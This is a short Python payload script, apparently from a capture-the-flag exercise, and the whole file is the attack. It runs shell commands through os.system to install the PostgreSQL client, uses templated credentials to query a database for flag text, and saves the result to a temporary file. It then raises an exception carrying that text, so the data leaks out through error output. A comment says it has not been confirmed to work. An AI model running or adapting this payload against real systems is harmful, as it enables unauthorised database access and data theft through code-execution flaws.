import os

# TODO: Confirm this actually works

os.system("""apt update;
apt install -y postgresql;
echo {password} | psql -h {host} -U {user} -p 5432 -d {database} -c "SELECT text FROM memos WHERE text LIKE 'FLAG%';" > /tmp/flag2.txt;
""")

with open("/tmp/flag2.txt") as fd:
    raise RuntimeError(fd.read())
